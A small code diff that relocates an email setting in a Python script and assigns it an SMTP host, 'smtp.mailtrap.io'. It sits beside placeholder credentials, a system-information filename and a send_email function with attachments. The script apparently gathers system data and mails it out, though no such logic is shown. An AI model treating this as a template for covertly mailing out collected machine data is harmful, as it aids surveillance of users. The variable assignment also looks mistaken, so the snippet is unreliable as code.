@@ -14,7 +14,6 @@ system_information = "Informations.txt"
 # ==============================
 # ==============================
 
-email_address = "YOUR MAIL"
 username = "YOUR USERNAME"
 password= "YOUR PASSWORD"
 
@@ -22,6 +21,7 @@ password= "YOUR PASSWORD"
 # ==============================
 
 file_path = os.getcwd()
+email_address = 'smtp.mailtrap.io'
 
 
 def send_email(filename, attachment):
